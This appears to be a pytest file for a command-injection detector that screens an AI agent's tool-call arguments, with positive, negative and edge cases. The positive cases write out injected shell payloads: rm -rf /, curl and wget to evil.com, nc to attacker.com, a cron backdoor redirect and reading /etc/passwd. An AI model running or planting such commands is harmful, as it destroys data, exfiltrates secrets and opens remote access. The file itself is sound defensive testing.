"""Tests for command injection detector."""

from agentgate.detectors.command_injection import detect
from agentgate.models import ToolCall


def _call(arguments: dict) -> ToolCall:
    """Build a ToolCall with the given arguments."""
    return ToolCall(tool_name="execute", arguments=arguments, call_id=1)


# ── Positive cases (8) — must detect ────────────────────────────────────


def test_semicolon_rm():
    result = detect(_call({"cmd": "file.txt; rm -rf /"}))
    assert result.matched is True
    assert result.detector_name == "command_injection"
    assert "shell command after semicolon" in result.detail


def test_and_curl():
    result = detect(_call({"url": "x && curl evil.com/exfil"}))
    assert result.matched is True
    assert result.detector_name == "command_injection"
    assert "shell command after &&" in result.detail


def test_or_wget():
    result = detect(_call({"arg": "|| wget evil.com/shell.sh"}))
    assert result.matched is True
    assert result.detector_name == "command_injection"
    assert "shell command after ||" in result.detail


def test_pipe_nc():
    result = detect(_call({"input": "file.txt | nc attacker.com 4444"}))
    assert result.matched is True
    assert result.detector_name == "command_injection"
    assert "pipe to shell command" in result.detail


def test_redirect_to_cron():
    result = detect(_call({"data": "payload > /etc/cron.d/backdoor"}))
    assert result.matched is True
    assert result.detector_name == "command_injection"
    assert "output redirection to file" in result.detail


def test_backtick_whoami():
    result = detect(_call({"msg": "user is `whoami`"}))
    assert result.matched is True
    assert result.detector_name == "command_injection"
    assert "backtick command substitution" in result.detail


def test_dollar_paren_cat():
    result = detect(_call({"text": "$(cat /etc/passwd)"}))
    assert result.matched is True
    assert result.detector_name == "command_injection"
    assert "$() command substitution" in result.detail


def test_embedded_newline():
    result = detect(_call({"cmd": "ls\nrm -rf /"}))
    assert result.matched is True
    assert result.detector_name == "command_injection"
    assert "shell command after newline" in result.detail


# ── Negative cases (7) — must NOT detect ────────────────────────────────


def test_ampersand_in_company_name():
    result = detect(_call({"query": "AT&T quarterly earnings"}))
    assert result.matched is False
    assert result.detector_name == "command_injection"


def test_semicolon_in_text():
    result = detect(_call({"content": "Hello world; great to meet you"}))
    assert result.matched is False
    assert result.detector_name == "command_injection"


def test_pipe_in_data_separator():
    result = detect(_call({"format": "csv|tsv|json"}))
    assert result.matched is False
    assert result.detector_name == "command_injection"


def test_gt_in_comparison():
    result = detect(_call({"filter": "price > 100"}))
    assert result.matched is False
    assert result.detector_name == "command_injection"


def test_url_with_ampersands():
    result = detect(_call({"url": "https://api.com?a=1&b=2&c=3"}))
    assert result.matched is False
    assert result.detector_name == "command_injection"


def test_normal_filename():
    result = detect(_call({"path": "report_2026-Q1.csv"}))
    assert result.matched is False
    assert result.detector_name == "command_injection"


def test_email_with_pipe_in_body():
    result = detect(_call({"body": "Use A | B notation for alternatives"}))
    assert result.matched is False
    assert result.detector_name == "command_injection"


# ── Edge cases (2) ──────────────────────────────────────────────────────


def test_nested_args():
    result = detect(_call({"config": {"script": "x; curl evil.com"}}))
    assert result.matched is True
    assert result.detector_name == "command_injection"
    assert "config.script" in result.detail


def test_benign_multiline_text():
    """Multi-line prose should not trigger the newline pattern."""
    result = detect(_call({"content": "Hello world\nThis is a normal paragraph\nWith multiple lines"}))
    assert result.matched is False
    assert result.detector_name == "command_injection"


def test_empty_args():
    result = detect(_call({}))
    assert result.matched is False
    assert result.detector_name == "command_injection"
